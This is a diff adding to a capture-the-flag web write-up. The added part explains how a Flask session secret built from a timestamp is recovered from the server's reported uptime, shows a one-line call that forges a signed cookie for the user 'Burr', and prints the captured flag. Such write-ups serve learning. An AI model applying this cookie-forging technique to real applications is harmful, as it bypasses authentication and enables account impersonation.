@@ -52,7 +52,27 @@ using it again we get /flag.txt endpoint but we cant use it directly<br>
 We need to move the file to /static using move method and then we get the flag<br>
 
 ### Thomas deverson
-didnt understand completely yet
+Looking at the source code of the page, we find a /backup end point <br>
+Going to the endpoint point, we see a flask code segment<br>
+![image](https://github.com/poorvi1910/Web/assets/146640913/e949eff9-f3d3-40a7-be10-b1226c52f2bc)<br>
+But using all three names in usename field is blcoked. That means we need to forge cookies<br>
+The scret key according to flask code is ```f'THE_REYNOLDS_PAMPHLET-{ datetime.now().strftime("%Y%m%d%H%M") }'```<br>
+If we try computing the date from the uptime given in the Status page:
+ ```
+#jumping ahead, now() doesn't work, but utcnow() does
+sign({"name":"Burr"}, f'THE_REYNOLDS_PAMPHLET-{(datetime.utcnow() - timedelta(days=82816, hours=16, minutes=51)).strftime("%Y%m%d%H%M")}')
+# 'eyJuYW1lIjoiQnVyciJ9.Zk_0mg.WlX1PYbdc8xh-svaFZj7aKa-wFs'
+```
+We get the flag
+```
+ <div class="col-xl-6 ml-auto jumbo-vertical-center">
+        <div>
+            <h1>Welcome fellow Democratic Republican!</h1>
+            <p>Don't tell Hamilton, but we totally know what he did.</p>
+            <strong>flag{f69f2c087b291b9da9c9fe9219ee130f}</strong>
+        </div>
+      </div>
+```
 
 ### Helpful desk
 didnt understand completely yet
